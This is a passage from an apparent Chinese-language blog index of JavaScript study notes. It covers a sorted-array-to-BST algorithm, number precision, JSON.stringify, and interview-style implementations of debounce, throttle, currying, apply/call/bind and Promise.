punctuation">,</span>right<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="有序数组转二叉搜索树"><a href="#有序数组转二叉搜索树" class="headerlink" title="有序数组转二叉搜索树"></a>有序数组转二叉搜索树</h2><p>将一个按照升序排列的有序数组，转换为一棵高度平衡二叉搜索树。</p><p>本题中，一个高度平衡二叉树是指一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过 1。</p><p>示例:</p><blockquote><p>给定有序数组: [-10,-3,0,5,9],</p><p>一个可能的答案是：[0,-3,9,-10,null,5]，它可以表示下面这个高度平衡二叉搜索树：</p><p>​       0<br>​      / \</p><p>   -3   9<br>   /   /<br>-10  5</p></blockquote><ul><li>每次取中间的值作为根节点</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> sortedArrayToBST <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span>    <span class="token keyword">let</span> mid <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span>length <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token function">sortedArrayToBST</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">)</span>    root<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token function">sortedArrayToBST</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> root<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// parseInt(nums.length / 2)      =>     nums.length >> 1</span></code></pre><p>   -</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>js的数值范围</title>
      <link href="2020/07/11/JavaScript-JS%E7%9A%84%E6%95%B0%E5%80%BC%E8%8C%83%E5%9B%B4/"/>
      <url>2020/07/11/JavaScript-JS%E7%9A%84%E6%95%B0%E5%80%BC%E8%8C%83%E5%9B%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="js的数值范围以及为什么"><a href="#js的数值范围以及为什么" class="headerlink" title="js的数值范围以及为什么"></a>js的数值范围以及为什么</h2><blockquote><p>JavaScript能表示并进行精确算术运算的整数范围为：正负2的53次方，也即从最小值-9007199254740992到最大值+9007199254740992之间的范围；对于超过这个范围的整数，JavaScript依旧可以进行运算，但却不保证运算结果的精度。 </p></blockquote><pre class=" language-js"><code class="language-js"><span class="token operator">+</span><span class="token string">"6145390195186705543"</span>    <span class="token comment" spellcheck="true">// 出现精度问题，6145390195186705000</span><span class="token function">BigInt</span><span class="token punctuation">(</span><span class="token string">"6145390195186705543"</span> <span class="token punctuation">)</span><span class="token operator">+</span>1n  <span class="token comment" spellcheck="true">//6145390195186705544n</span></code></pre><a id="more"></a><p>JavaScript 内部，所有数字都是以64位浮点数形式储存，即使整数也是如此。所以，<code>1</code>与<code>1.0</code>是相同的，是同一个数。</p><pre class=" language-js"><code class="language-js"><span class="token number">1</span> <span class="token operator">===</span> <span class="token number">1.0</span> <span class="token comment" spellcheck="true">// true</span></code></pre><p>由于浮点数不是精确的值，所以涉及小数的比较和运算要特别小心。</p><pre class=" language-js"><code class="language-js"><span class="token number">0.1</span> <span class="token operator">+</span> <span class="token number">0.2</span> <span class="token operator">===</span> <span class="token number">0.3</span><span class="token comment" spellcheck="true">// false</span><span class="token comment" spellcheck="true">//0.1 => 0.0001 1001 1001 1001…（无限循环）</span><span class="token comment" spellcheck="true">//0.2 => 0.0011 0011 0011 0011…（无限循环）</span><span class="token comment" spellcheck="true">//双精度浮点数的小数部分最多支持 52 位，所以两者相加之后得到这么一串 0.0100110011001100110011001100110011001100110011001100因浮点数小数位的限制而截断的二进制数字，这时候，我们再把它转换为十进制，就成了0.30000000000000004。</span><span class="token number">0.3</span> <span class="token operator">/</span> <span class="token number">0.1</span><span class="token comment" spellcheck="true">// 2.999999999999999</span><span class="token punctuation">(</span><span class="token number">0.3</span> <span class="token operator">-</span> <span class="token number">0.2</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token punctuation">(</span><span class="token number">0.2</span> <span class="token operator">-</span> <span class="token number">0.1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// false</span></code></pre><h3 id="数值精度"><a href="#数值精度" class="headerlink" title="数值精度"></a>数值精度</h3><p>根据国际标准 IEEE 754，JavaScript 浮点数的64个二进制位，从最左边开始，是这样组成的。</p><ul><li>第1位：符号位，<code>0</code>表示正数，<code>1</code>表示负数      （1位）</li><li>第2位到第12位：指数部分                                 （11位）</li><li>第13位到第64位：尾数部分                               （52位）</li></ul><p>符号位决定了一个数的正负，指数部分决定了数值的大小，小数部分决定了数值的精度。 </p><pre class=" language-js"><code class="language-js">IEEE <span class="token number">754</span> 规定，有效数字第一位默认总是<span class="token number">1</span>，不保存在<span class="token number">64</span>位浮点数之中。也就是说，有效数字总是<span class="token number">1</span><span class="token punctuation">.</span>xx<span class="token operator">...</span>xx的形式，其中xx<span class="token punctuation">.</span><span class="token punctuation">.</span>xx的部分保存在<span class="token number">64</span>位浮点数之中，最长可能为<span class="token number">52</span>位。因此，JavaScript 提供的有效数字最长为<span class="token number">53</span>个二进制位。<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">^</span>符号位 <span class="token operator">*</span> <span class="token number">1</span><span class="token punctuation">.</span>xx<span class="token operator">...</span>xx <span class="token operator">*</span> <span class="token number">2</span><span class="token operator">^</span>指数位<span class="token function">精度最多只能到53个二进制位</span><span class="token punctuation">(</span>有一位不在浮点数中<span class="token punctuation">)</span>，这意味着，绝对值小于<span class="token number">2</span>的<span class="token number">53</span>次方的整数，即<span class="token operator">-</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">53</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>到<span class="token number">2</span><span class="token operator">^</span><span class="token number">53</span><span class="token operator">-</span><span class="token number">1</span>，都可以精确表示。<span class="token number">2</span><span class="token operator">^</span><span class="token number">0</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">1</span><span class="token operator">+</span><span class="token operator">...</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">52</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">^</span><span class="token number">53</span><span class="token operator">-</span><span class="token number">1</span> </code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JSON.stringify详解</title>
      <link href="2020/04/12/JavaScript-JSON.stringify%E8%AF%A6%E8%A7%A3/"/>
      <url>2020/04/12/JavaScript-JSON.stringify%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>我们都知道toString是用于处理非字符串到字符串的强制类型转换（隐式类型转换）</p><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>  a<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//[object Object]</span><span class="token keyword">let</span> b<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>b<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//数组的toString被重写了，所以输出"1,2,3"</span></code></pre><p>JSON.stringify将JSON对象序列化时也用到了toString()</p><h3 id="先说结论"><a href="#先说结论" class="headerlink" title="先说结论"></a>先说结论</h3><ul><li><p>安全的JSON值可以序列化，不安全的JSON值会特殊处理</p></li><li><p>安全：字符串，数字，布尔值和null的JSON.stringify与toString基本相同</p></li><li>不安全：undefined,function,symbol会特殊处理，如果传递给JSON.stringify的对象中定义了toJSON方法，那么该方法会在字符串化前调用，将对象转化为安全JSON值</li></ul><h3 id="不安全的JSON值"><a href="#不安全的JSON值" class="headerlink" title="不安全的JSON值"></a>不安全的JSON值</h3><h3 id="（1）undefined-function-symbol"><a href="#（1）undefined-function-symbol" class="headerlink" title="（1）undefined,function,symbol"></a>（1）undefined,function,symbol</h3><ol><li>直接放在对象中：undefined</li></ol><pre class=" language-js"><code class="language-js">JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>undefined<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//undefined</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//undefined</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token function">Symbol</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//undefined</span></code></pre><ol start="2"><li>放在数组中：输出null</li></ol><pre class=" language-js"><code class="language-js">JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span>undefined<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function">Symbol</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//[1,null,null,null,4]</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>    <span class="token punctuation">{</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span>b<span class="token punctuation">:</span>undefined<span class="token punctuation">,</span>c<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>d<span class="token punctuation">:</span><span class="token function">Symbol</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>e<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//{"a":1,"e":4}</span></code></pre><h3 id="（2）循环引用"><a href="#（2）循环引用" class="headerlink" title="（2）循环引用"></a>（2）循环引用</h3><p>可以定义toJSON方法来返回安全的JSON值</p><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>    b<span class="token punctuation">:</span><span class="token number">42</span><span class="token punctuation">,</span>    c<span class="token punctuation">:</span>o<span class="token punctuation">,</span>    d<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span>o<span class="token punctuation">.</span>e <span class="token operator">=</span> a <span class="token comment" spellcheck="true">//创建循环引用</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//报错</span><span class="token comment" spellcheck="true">//自定义一下toJSON</span>a<span class="token punctuation">.</span>toJSON <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>b<span class="token punctuation">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>b<span class="token punctuation">}</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//{"b":42}</span></code></pre><p>也就是说，toJSON应该返回一个能够被字符串化的安全JSON值</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">{</span> val<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> toJSON<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>val<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//"[2,3]"</span></code></pre><h2 id="JSON-stringify的几个参数"><a href="#JSON-stringify的几个参数" class="headerlink" title="JSON.stringify的几个参数"></a>JSON.stringify的几个参数</h2><h3 id="（1）replacer"><a href="#（1）replacer" class="headerlink" title="（1）replacer"></a>（1）replacer</h3><ul><li>是一个数组，那么他必须是一个字符串数组，其中包含的是要序列化的，除此之外的属性被忽略</li><li>是一个函数，对对象本身调用一次，然后对每个属性各调用一次</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>    b<span class="token punctuation">:</span><span class="token number">42</span><span class="token punctuation">,</span>    c<span class="token punctuation">:</span><span class="token string">"42"</span><span class="token punctuation">,</span>    d<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"b"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//{"b":42,"c":"42"}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">!==</span><span class="token string">"c"</span><span class="token punctuation">)</span> <span class="token keyword">return</span> v<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//{"b":42,"d":[1,2,3]}</span></code></pre><h3 id="（2）space"><a href="#（2）space" class="headerlink" title="（2）space"></a>（2）space</h3><p>用于指定缩进格式</p><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>    b<span class="token punctuation">:</span><span class="token number">42</span><span class="token punctuation">,</span>    c<span class="token punctuation">:</span><span class="token string">"42"</span><span class="token punctuation">,</span>    d<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">/*{   "b": 42,   "c": "42",   "d": [      1,      2,      3   ]}*/</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token string">'----'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">/*{----"b": 42,----"c": "42",----"d": [--------1,--------2,--------3----]}*/</span></code></pre><h2 id="联系序列化深拷贝"><a href="#联系序列化深拷贝" class="headerlink" title="联系序列化深拷贝"></a>联系序列化深拷贝</h2><p>JSON.parse(JSON.stringify(obj)) 的问题：</p><ol><li>对象的属性值是函数时，无法拷贝。</li><li>原型链上的属性无法拷贝</li><li>不能正确的处理 Date 类型的数据</li><li>不能处理 RegExp</li><li>会忽略 symbol</li><li>会忽略 undefined</li></ol><p><strong>由此可知，无法处理函数,undefied,symbol是因为不是安全的JSON格式</strong></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>手写代码（一）</title>
      <link href="2020/03/20/%E9%9D%A2%E8%AF%95-%E6%89%8B%E5%86%99%E4%BB%A3%E7%A0%81%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2020/03/20/%E9%9D%A2%E8%AF%95-%E6%89%8B%E5%86%99%E4%BB%A3%E7%A0%81%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>防抖</li><li>节流</li><li>柯里化</li><li>apply,bind,call</li><li>promise.all</li><li>promise.race</li><li>promise</li><li>promise封装ajax</li><li>发布订阅模式</li><li>Symbol.iterator</li></ul><h2 id="防抖"><a href="#防抖" class="headerlink" title="防抖"></a>防抖</h2><p><strong>在第一次触发事件时，不立即执行函数，而是给出一个期限值比如200ms</strong>，然后：</p><ul><li>如果在200ms内没有再次触发滚动事件，那么就执行函数</li><li>如果在200ms内再次触发滚动事件，那么当前的计时取消，重新开始计时</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 防抖debounce</span><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span>func<span class="token punctuation">,</span> wait<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> timer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 保存this和arguments是为了让debounce函数最终返回的函数this指向不变以及依旧能够接收到event参数。</span>    <span class="token keyword">let</span> context <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> args <span class="token operator">=</span> arguments<span class="token punctuation">;</span>    timer <span class="token operator">&amp;&amp;</span> <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span>    timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      fn<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">out</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"防抖"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>window<span class="token punctuation">.</span>onscroll <span class="token operator">=</span> <span class="token function">debounce</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span></code></pre><h2 id="节流"><a href="#节流" class="headerlink" title="节流"></a>节流</h2><p>如果短时间内大量触发同一事件，那么<strong>在函数执行一次之后，该函数在指定的时间期限内不再工作</strong>，直至过了这段时间才重新生效。 </p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">throttle</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span>delay<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">let</span> lastTime <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> now <span class="token operator">=</span> <span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>now <span class="token operator">-</span> lastTime <span class="token operator">></span> delay<span class="token punctuation">)</span> <span class="token punctuation">{</span>            fn<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>            lastTime <span class="token operator">=</span> now<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">out</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"节流"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>window<span class="token punctuation">.</span>onscroll <span class="token operator">=</span> <span class="token function">throttle</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span></code></pre><h2 id="柯里化"><a href="#柯里化" class="headerlink" title="柯里化"></a>柯里化</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> curry <span class="token operator">=</span> <span class="token punctuation">(</span>fn<span class="token punctuation">,</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span> args<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> fn<span class="token punctuation">.</span>length                <span class="token operator">?</span><span class="token punctuation">(</span><span class="token operator">...</span>arguments<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">curry</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span><span class="token operator">...</span>args<span class="token punctuation">,</span><span class="token operator">...</span>arguments<span class="token punctuation">)</span>                <span class="token punctuation">:</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span></code></pre><h2 id="apply，call，bind"><a href="#apply，call，bind" class="headerlink" title="apply，call，bind"></a>apply，call，bind</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//apply</span>Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>myApply <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>thisArg<span class="token punctuation">,</span>rest<span class="token punctuation">)</span><span class="token punctuation">{</span>  thisArg <span class="token operator">=</span> thisArg <span class="token operator">||</span> window  thisArg<span class="token punctuation">.</span>func <span class="token operator">=</span> <span class="token keyword">this</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>rest<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">let</span> result <span class="token operator">=</span> thisArg<span class="token punctuation">.</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>      <span class="token keyword">let</span> result <span class="token operator">=</span> thisArg<span class="token punctuation">.</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token operator">...</span>rest<span class="token punctuation">)</span>      <span class="token punctuation">}</span>  <span class="token keyword">delete</span> thisArg<span class="token punctuation">.</span>func  <span class="token keyword">return</span> result<span class="token punctuation">}</span><span class="token comment" spellcheck="true">//call</span>Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>myCall <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">let</span> <span class="token punctuation">[</span>thisArg<span class="token punctuation">,</span><span class="token operator">...</span>args<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>arguments<span class="token punctuation">]</span>  thisArg <span class="token operator">=</span> thisArg <span class="token operator">||</span> window  thisArg<span class="token punctuation">.</span>func <span class="token operator">=</span> <span class="token keyword">this</span>  <span class="token keyword">let</span> result <span class="token operator">=</span> thisArg<span class="token punctuation">.</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span>  <span class="token keyword">delete</span> thisArg<span class="token punctuation">.</span>func  <span class="token keyword">return</span> result <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//bind</span>Function<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>myBind <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">let</span> <span class="token punctuation">[</span>thisArg<span class="token punctuation">,</span><span class="token operator">...</span>args<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>arguments<span class="token punctuation">]</span>  <span class="token keyword">let</span> that <span class="token operator">=</span> <span class="token keyword">this</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    <span class="token keyword">return</span> that<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>thisArg<span class="token punctuation">,</span><span class="token operator">...</span>args<span class="token punctuation">,</span><span class="token operator">...</span>arguments<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h2><ul><li>三种状态：pending，fulfilled，rejected</li><li>new Promise 时传进来一个执行器（参数是resolve和reject），是立即执行的</li><li>resolve函数的作用是改变状态为fulfilled，存储成功的值：value </li><li>reject函数的作用的改变状态为rejected，存储失败的原因：reason</li><li>then函数有两个参数，成功回调和失败回调，首先判断状态，fulfilled则执行成功回调，rejected则执行失败回调，pending则把回调存储起来</li><li>then要实现链式调用，需要返回 promise，then方法原来的操作可以放进新建 promise2 的执行器中立即执行，并且需要获取当前的返回值 x，传递给下一个 then 方法</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> PENDING <span class="token operator">=</span> <span class="token string">'pending'</span> <span class="token comment" spellcheck="true">// 等待</span><span class="token keyword">const</span> FULFILLED <span class="token operator">=</span> <span class="token string">'fulfilled'</span> <span class="token comment" spellcheck="true">// 成功</span><span class="token keyword">const</span> REJECTED <span class="token operator">=</span> <span class="token string">'rejected'</span> <span class="token comment" spellcheck="true">//失败</span><span class="token keyword">class</span> <span class="token class-name">MyPromise</span> <span class="token punctuation">{</span>  constructor <span class="token punctuation">(</span>executor<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">executor</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>resolve<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>reject<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// promise 状态</span>  status <span class="token operator">=</span> PENDING  <span class="token comment" spellcheck="true">// 成功之后的值</span>  value <span class="token operator">=</span> undefined  <span class="token comment" spellcheck="true">// 失败后的原因</span>  reason <span class="token operator">=</span> undefined  <span class="token comment" spellcheck="true">// 成功回调，用数组的原因是可能有多个 promise.then</span>  successCallback <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">// 失败回调</span>  failCallback <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">// 定义成箭头函数的好处是 this 指向当前类</span>  resolve <span class="token operator">=</span> value <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 如果状态不是等待 阻止程序向下执行 因为状态一旦确定就不可以再改变</span>    <span class="token 